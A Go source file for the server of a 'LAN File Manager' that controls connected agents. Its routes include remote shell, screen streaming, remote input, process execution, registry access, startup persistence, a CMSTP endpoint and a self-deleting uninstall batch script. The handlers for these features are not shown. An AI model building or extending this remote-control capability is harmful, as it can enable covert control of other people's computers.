//go:build !agent
// +build !agent

package main

import (
	"context"
	"flag"
	"fmt"
	"html/template"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"multifs-advanced/internal/config"
	"multifs-advanced/internal/wsmini"
)

func main() {
	listen := flag.String("listen", config.DefaultServerAddress, "listen address (use 0.0.0.0:8080 for LAN)")
	extraPorts := flag.String("ports", "", "additional ports to listen on (comma-separated, e.g., 8081,8082)")
	flag.Parse()

	s := newServer()
	s.setListenAddress(*listen)

	if *extraPorts != "" {
		parts := strings.Split(*extraPorts, ",")
		for _, p := range parts {
			p = strings.TrimSpace(p)
			if p != "" {
				s.ports = append(s.ports, p)
			}
		}
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodPost {
			s.loginPost(w, r)
			return
		}
		s.loginPage(w, r)
	})
	mux.HandleFunc("/logout", s.logout)
	mux.HandleFunc("/health", s.health)

	mux.HandleFunc("/", s.root)
	mux.HandleFunc("/browse", s.browse)
	mux.HandleFunc("/download", s.download)
	mux.HandleFunc("/view", s.view)
	mux.HandleFunc("/preview", s.preview)
	mux.HandleFunc("/upload", s.upload)
	mux.HandleFunc("/rename", s.rename)
	mux.HandleFunc("/delete", s.deleteOne)
	mux.HandleFunc("/bulk-delete", s.bulkDelete)
	mux.HandleFunc("/download-zip", s.zipDownload)
	mux.HandleFunc("/bulk-zip", s.bulkZip)
	mux.HandleFunc("/settings", s.settings)
	mux.HandleFunc("/systems", s.systemsPage)
	mux.HandleFunc("/control", s.controlPage)
	mux.HandleFunc("/remote", s.remotePage)
	mux.HandleFunc("/settings/autostart", s.settingsStub)
	mux.HandleFunc("/settings/users", s.settingsStub)
	mux.HandleFunc("/settings/preferences", s.settingsStub)
	mux.HandleFunc("/settings/log", s.settingsStub)
	mux.HandleFunc("/settings/uninstall", s.settingsUninstall)
	mux.HandleFunc("/settings/diagnostics", s.diagnosticsPage)
	mux.HandleFunc("/settings/diagnostics/test", s.runDiagnostics)
	mux.HandleFunc("/favorites/add", s.favAdd)
	mux.HandleFunc("/favorites/remove", s.favRemove)
	mux.HandleFunc("/server-url", s.serverURLPost)

	// API endpoints
	mux.HandleFunc("/api/agents", s.apiAgents)
	mux.HandleFunc("/api/current-agent", s.apiCurrentAgent)
	mux.HandleFunc("/api/select-agent", s.apiSelectAgent)
	mux.HandleFunc("/api/clear-selection", s.apiClearSelection)
	mux.HandleFunc("/api/rename-agent", s.apiRenameAgent)
	mux.HandleFunc("/api/remove-agent", s.apiRemoveAgent)
	mux.HandleFunc("/api/drives", s.apiDrives)
	mux.HandleFunc("/api/files/search", s.apiFileSearch)
	mux.HandleFunc("/api/agent/update-file", s.apiAgentUpdateFile)
	mux.HandleFunc("/api/agent/self-update", s.apiAgentSelfUpdate)
	mux.HandleFunc("/api/server/self-update", s.apiServerSelfUpdate)
	mux.HandleFunc("/api/power", s.apiPower)
	mux.HandleFunc("/api/fun", s.apiFun)
	mux.HandleFunc("/api/messagebox", s.apiMessageBox)
	mux.HandleFunc("/api/screen/capture", s.apiScreenCapture)
	mux.HandleFunc("/api/screen/stream", s.apiScreenStream)
	mux.HandleFunc("/api/remote/input", s.apiRemoteInput)
	mux.HandleFunc("/api/processes", s.apiProcesses)
	mux.HandleFunc("/api/processes/kill", s.apiProcessKill)
	mux.HandleFunc("/api/processes/run", s.apiProcessRun)
	mux.HandleFunc("/api/registry", s.apiRegistry)
	mux.HandleFunc("/api/registry/read", s.apiRegistryRead)
	mux.HandleFunc("/api/shell", s.apiShell)
	mux.HandleFunc("/api/startup", s.apiStartup)
	mux.HandleFunc("/api/startup/remove", s.apiStartupRemove)
	mux.HandleFunc("/api/cmstp", s.apiCmstp)
	mux.HandleFunc("/api/logs", s.apiLogs)
	mux.HandleFunc("/api/agent/uninstall", s.apiAgentUninstall)
	mux.HandleFunc("/api/agent/close", s.apiAgentControl)
	mux.HandleFunc("/api/agent/relaunch", s.apiAgentControl)
	mux.HandleFunc("/api/agent/startup/install", s.apiAgentStartup)
	mux.HandleFunc("/api/agent/startup/uninstall", s.apiAgentStartup)
	mux.HandleFunc("/api/agent/startup/status", s.apiAgentStartup)
	mux.HandleFunc("/api/server-info", s.apiServerInfo)

	mux.HandleFunc("/ws/agent", s.agentWS)
	mux.HandleFunc("/static/", serveStatic)

	// Start main server.  We bind manually instead of calling ListenAndServe so
	// the program can recover cleanly when 8080 is already occupied.  This is a
	// common Windows failure mode when an old server.exe is still running.
	ln, actualAddr, err := listenWithAutoPort(*listen)
	if err != nil {
		log.Fatal(err)
	}
	s.setListenAddress(actualAddr)

	srv := &http.Server{
		Addr:         actualAddr,
		Handler:      mux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  120 * time.Second,
	}
	s.httpSrv = srv

	// UDP LAN discovery lets agents on the same network find this server without
	// manually typing the server IP.  It is intentionally LAN-only.
	discoveryErr := startDiscoveryResponder(s)

	// Start additional port listeners.  These remain best-effort only.
	for _, port := range s.ports {
		go func(p string) {
			addr := "0.0.0.0:" + p
			log.Printf("additional listener on %s", addr)
			extraSrv := &http.Server{
				Addr:         addr,
				Handler:      mux,
				ReadTimeout:  30 * time.Second,
				WriteTimeout: 30 * time.Second,
				IdleTimeout:  120 * time.Second,
			}
			if err := extraSrv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
				log.Printf("additional listener error on %s: %v", addr, err)
			}
		}(port)
	}

	log.Printf("server listening on %s", actualAddr)
	log.Printf("open this computer: http://127.0.0.1:%s", s.serverPort(nil))
	for _, ip := range lanIPv4s() {
		log.Printf("open from LAN: http://%s:%s", ip, s.serverPort(nil))
	}
	if discoveryErr != nil {
		log.Printf("agent auto-discovery disabled on UDP port %d: %v", discoveryUDPPort, discoveryErr)
	} else {
		log.Printf("agent auto-discovery enabled on UDP port %d", discoveryUDPPort)
	}

	if err := srv.Serve(ln); err != nil && err != http.ErrServerClosed {
		log.Fatal(err)
	}
}

func listenWithAutoPort(requested string) (net.Listener, string, error) {
	requested = strings.TrimSpace(requested)
	if requested == "" {
		requested = config.DefaultServerAddress
	}
	host, port, err := net.SplitHostPort(requested)
	if err != nil {
		// Accept a bare port such as "8080" for convenience.
		if strings.Count(requested, ":") == 0 {
			host = "0.0.0.0"
			port = requested
		} else {
			return nil, "", err
		}
	}
	if host == "" || host == "::" {
		host = "0.0.0.0"
	}
	if port == "" {
		port = "8080"
	}

	tryAddr := func(p string) (net.Listener, string, error) {
		addr := net.JoinHostPort(host, p)
		ln, err := net.Listen("tcp4", addr)
		if err == nil {
			return ln, net.JoinHostPort(host, listenerPort(ln)), nil
		}
		if host != "0.0.0.0" {
			fallback := net.JoinHostPort("0.0.0.0", p)
			ln2, err2 := net.Listen("tcp4", fallback)
			if err2 == nil {
				log.Printf("could not bind %s: %v", addr, err)
				return ln2, net.JoinHostPort("0.0.0.0", listenerPort(ln2)), nil
			}
		}
		return nil, "", err
	}

	ln, addr, err := tryAddr(port)
	if err == nil {
		return ln, addr, nil
	}
	log.Printf("port %s is unavailable (%v); trying the next free port", port, err)

	// Try a small predictable range so the UI stays simple while avoiding the
	// common duplicate-server problem.
	base := atoiDefault(port, 8080)
	for p := base + 1; p <= base+25; p++ {
		ln, addr, err := tryAddr(fmt.Sprintf("%d", p))
		if err == nil {
			log.Printf("using fallback port %d", p)
			return ln, addr, nil
		}
	}
	return nil, "", err
}

func listenerPort(ln net.Listener) string {
	_, port, err := net.SplitHostPort(ln.Addr().String())
	if err != nil || port == "" {
		return "8080"
	}
	return port
}

func atoiDefault(s string, def int) int {
	var out int
	if _, err := fmt.Sscanf(strings.TrimSpace(s), "%d", &out); err != nil || out <= 0 {
		return def
	}
	return out
}

func (s *server) health(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, map[string]any{
		"ok":      true,
		"version": config.ServerVersion,
		"time":    time.Now().UTC().Format(time.RFC3339),
	})
}

func (s *server) remotePage(w http.ResponseWriter, r *http.Request) {
	se, ok := s.requireSession(w, r)
	if !ok {
		return
	}
	tpl := template.Must(template.ParseFS(tplFS, "templates/remote.html"))
	_ = tpl.Execute(w, s.pageDataForSession(se, map[string]any{
		"Title": "Remote Control",
	}))
}

func (s *server) diagnosticsPage(w http.ResponseWriter, r *http.Request) {
	se, ok := s.requireSession(w, r)
	if !ok {
		return
	}
	tpl := template.Must(template.ParseFS(tplFS, "templates/diagnostics.html"))
	_ = tpl.Execute(w, s.pageDataForSession(se, map[string]any{
		"Title": "Diagnostics",
	}))
}

// runDiagnostics returns a comprehensive runtime snapshot grouped by area
// (server, agents, network, storage, runtime). Each item has a status and a
// human-readable message; the diagnostics page renders them in categories.
func (s *server) runDiagnostics(w http.ResponseWriter, r *http.Request) {
	if _, ok := s.requireSession(w, r); !ok {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	type item struct {
		Category string `json:"category"`
		Name     string `json:"name"`
		Status   string `json:"status"` // ok | warning | error | info
		Message  string `json:"message"`
	}
	var results []item
	add := func(category, name, status, message string) {
		results = append(results, item{Category: category, Name: name, Status: status, Message: message})
	}

	// ── Server ────────────────────────────────────────────────────────────────
	hostname, _ := os.Hostname()
	uptime := time.Since(s.startedAtUTC()).Round(time.Second)
	add("Server", "Server Status", "ok", fmt.Sprintf("Running normally · uptime %s", uptime))
	add("Server", "Version", "info", config.ServerVersion)
	add("Server", "Listen Address", "ok", fmt.Sprintf("%s · %d active session(s)", s.getListenAddress(), s.sessionCount()))
	if hostname != "" {
		add("Server", "Hostname", "info", hostname)
	}
	add("Server", "Working Directory", "info", workingDir())
	add("Server", "Build", "info",
		fmt.Sprintf("%s · %s/%s", runtime.Version(), runtime.GOOS, runtime.GOARCH))

	// ── Runtime ───────────────────────────────────────────────────────────────
	var ms runtime.MemStats
	runtime.ReadMemStats(&ms)
	add("Runtime", "Memory (alloc)", "info", humanBytes(int64(ms.Alloc)))
	add("Runtime", "Memory (sys)", "info", humanBytes(int64(ms.Sys)))
	add("Runtime", "Memory (heap)", "info",
		fmt.Sprintf("%s in-use / %s reserved", humanBytes(int64(ms.HeapAlloc)), humanBytes(int64(ms.HeapSys))))
	add("Runtime", "GC", "info",
		fmt.Sprintf("%d cycles · last %s ago",
			ms.NumGC,
			time.Since(time.Unix(0, int64(ms.LastGC))).Round(time.Millisecond)))
	add("Runtime", "Goroutines", "info", fmt.Sprintf("%d", runtime.NumGoroutine()))
	add("Runtime", "CPU Cores", "info", fmt.Sprintf("%d available", runtime.NumCPU()))
	add("Runtime", "PID", "info", fmt.Sprintf("%d", os.Getpid()))

	// ── Agents ────────────────────────────────────────────────────────────────
	s.knownMu.RLock()
	onlineCount, totalCount := 0, len(s.known)
	liteCount, fullCount := 0, 0
	for _, a := range s.known {
		if a.Online {
			onlineCount++
		}
		if looksLikeLiteAgent(a.Build, a.Version, a.Name, a.Key) {
			liteCount++
		} else {
			fullCount++
		}
	}
	s.knownMu.RUnlock()

	if totalCount == 0 {
		add("Agents", "Inventory", "warning", "No agents have ever connected")
	} else if onlineCount == 0 {
		add("Agents", "Inventory", "warning",
			fmt.Sprintf("%d known agent(s), 0 online", totalCount))
	} else {
		add("Agents", "Inventory", "ok",
			fmt.Sprintf("%d of %d agents online", onlineCount, totalCount))
	}
	add("Agents", "Profile Mix", "info",
		fmt.Sprintf("%d Lite · %d Full", liteCount, fullCount))

	// Live socket count (vs. "known" registry count).
	s.agentsMu.RLock()
	liveSockets := len(s.agents)
	s.agentsMu.RUnlock()
	add("Agents", "Live Sockets", "info",
		fmt.Sprintf("%d active WebSocket connection(s)", liveSockets))
	add("Agents", "Frame Cap", "info",
		fmt.Sprintf("%s per WebSocket frame", humanBytes(int64(wsmini.MaxFrameSize))))

	// ── Storage ───────────────────────────────────────────────────────────────
	if fi, err := os.Stat("agents_db.json"); err == nil {
		add("Storage", "Agent Database", "ok",
			fmt.Sprintf("%s · last write %s ago", humanBytes(fi.Size()),
				time.Since(fi.ModTime()).Round(time.Second)))
	} else {
		add("Storage", "Agent Database", "info", "Will be created on first agent connection")
	}
	if _, err := staticFS.ReadFile("static/css/style.css"); err == nil {
		add("Storage", "Static Assets", "ok", "Embedded CSS/JS loaded")
	} else {
		add("Storage", "Static Assets", "error", "Embedded static files not found")
	}
	if _, err := tplFS.ReadFile("templates/files.html"); err == nil {
		add("Storage", "Templates", "ok", "Embedded templates loaded")
	} else {
		add("Storage", "Templates", "error", "Embedded templates not found")
	}

	// ── Network ───────────────────────────────────────────────────────────────
	ips := []string{}
	if ifaces, err := net.Interfaces(); err == nil {
		for _, iface := range ifaces {
			if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
				continue
			}
			addrs, _ := iface.Addrs()
			for _, a := range addrs {
				if ipn, ok := a.(*net.IPNet); ok && ipn.IP.To4() != nil {
					ips = append(ips, ipn.IP.String())
				}
			}
		}
	}
	if len(ips) > 0 {
		add("Network", "LAN Interfaces", "ok", strings.Join(ips, ", "))
	} else {
		add("Network", "LAN Interfaces", "warning", "No IPv4 LAN addresses detected")
	}
	add("Network", "Discovery", "ok",
		fmt.Sprintf("Auto-discovery UDP port %d", discoveryUDPPort))

	writeJSON(w, map[string]any{"results": results})
}

// startedAtUTC returns the server's start timestamp. Initialized once when
// the server boots; if unset, it falls back to "now" so uptime reads as 0s.
func (s *server) startedAtUTC() time.Time {
	if s == nil || s.startedAt.IsZero() {
		return time.Now().UTC()
	}
	return s.startedAt
}

func (s *server) sessionCount() int {
	if s == nil {
		return 0
	}
	s.mu.RLock()
	n := len(s.sessions)
	s.mu.RUnlock()
	return n
}

func workingDir() string {
	if d, err := os.Getwd(); err == nil {
		return d
	}
	return "(unknown)"
}

func (s *server) settings(w http.ResponseWriter, r *http.Request) {
	se, ok := s.requireSession(w, r)
	if !ok {
		return
	}
	connInfo := s.agentInfo(r)
	serverSaved := r.URL.Query().Get("server_saved") == "1"
	tpl := template.Must(template.ParseFS(tplFS, "templates/settings.html"))
	_ = tpl.Execute(w, s.pageDataForSession(se, map[string]any{
		"Title":                 "LAN File Manager",
		"Username":              se.username,
		"UserLevel":             "Admin",
		"Host":                  "",
		"OS":                    "",
		"Arch":                  "",
		"Version":               config.ServerVersion,
		"Uptime":                "n/a",
		"SessionCount":          len(s.sessions),
		"UserCount":             1,
		"OpsCount":              0,
		"UsersFile":             "(compiled)",
		"Addr":                  r.Host,
		"Theme":                 "dark",
		"Density":               "comfortable",
		"Message":               "",
		"Error":                 "",
		"MemoryAllocHuman":      "n/a",
		"MemorySysHuman":        "n/a",
		"AutoRefreshDrives":     true,
		"ConfirmBulkDelete":     true,
		"ShowHidden":            false,
		"ReadOnlyGlobal":        false,
		"CanAdmin":              true,
		"AutoStartEnabled":      false,
		"HomePath":              "",
		"Drives":                []any{},
		"Users":                 []any{},
		"AgentServerURL":        connInfo.AgentServerURL,
		"AgentServerCandidates": connInfo.Candidates,
		"ServerLANIPs":          connInfo.LANIPs,
		"AgentConfigJSON":       connInfo.ConfigJSON,
		"AgentLaunchCommand":    connInfo.LaunchCommand,
		"ServerURLSaved":        serverSaved,
	}))
}

func (s *server) settingsStub(w http.ResponseWriter, r *http.Request) {
	if _, ok := s.requireSession(w, r); !ok {
		return
	}
	http.Redirect(w, r, "/settings", http.StatusFound)
}

func (s *server) settingsUninstall(w http.ResponseWriter, r *http.Request) {
	se, ok := s.requireSession(w, r)
	if !ok {
		return
	}
	if se.username != adminUsername {
		http.Error(w, "forbidden", http.StatusForbidden)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	_ = r.ParseForm()
	pw := strings.TrimSpace(r.FormValue("password"))
	if pw != "" && pw != s.authPassword() {
		http.Error(w, "wrong password", http.StatusBadRequest)
		return
	}

	exe, _ := os.Executable()
	exe = filepath.Clean(exe)

	targets := []string{"agents_db.json"}
	if exe != "" {
		targets = append(targets, filepath.Join(filepath.Dir(exe), "agents_db.json"))
	}

	tmpDir := os.TempDir()
	scriptPath := filepath.Join(tmpDir, fmt.Sprintf("multifs_uninstall_%d.bat", time.Now().UnixNano()))
	pid := os.Getpid()

	// Self-deleting uninstall script. The `(goto) 2>nul & del "%~f0"` idiom
	// closes cmd.exe's open handle on the script file before the delete, so
	// no spurious "The batch file cannot be found" message is emitted. Only
	// the listed targets and the running server EXE are deleted — never the
	// parent directory, which can contain unrelated user files.
	var sb strings.Builder
	sb.WriteString("@echo off\r\n")
	sb.WriteString("ping -n 3 127.0.0.1 >nul\r\n")
	sb.WriteString(fmt.Sprintf("taskkill /F /PID %d >nul 2>&1\r\n", pid))
	sb.WriteString("ping -n 2 127.0.0.1 >nul\r\n")
	for _, t := range targets {
		sb.WriteString(fmt.Sprintf("del /F /Q \"%s\" >nul 2>&1\r\n", t))
	}
	if exe != "" {
		sb.WriteString(fmt.Sprintf("del /F /Q \"%s\" >nul 2>&1\r\n", exe))
	}
	sb.WriteString("(goto) 2>nul & del /F /Q \"%~f0\"\r\n")

	_ = os.WriteFile(scriptPath, []byte(sb.String()), 0644)

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_, _ = io.WriteString(w, "<html><body style='font-family:system-ui;background:#0b1220;color:#e5e7eb;padding:22px'>"+
		"<h2>Uninstall started</h2>"+
		"<p>The server will stop and delete itself in a few seconds.</p>"+
		"<p>You may close this tab.</p>"+
		"</body></html>")

	go func() {
		time.Sleep(400 * time.Millisecond)
		if s.httpSrv != nil {
			_ = s.httpSrv.Shutdown(context.Background())
		}
		_ = launchUninstallScript(scriptPath)
	}()
}
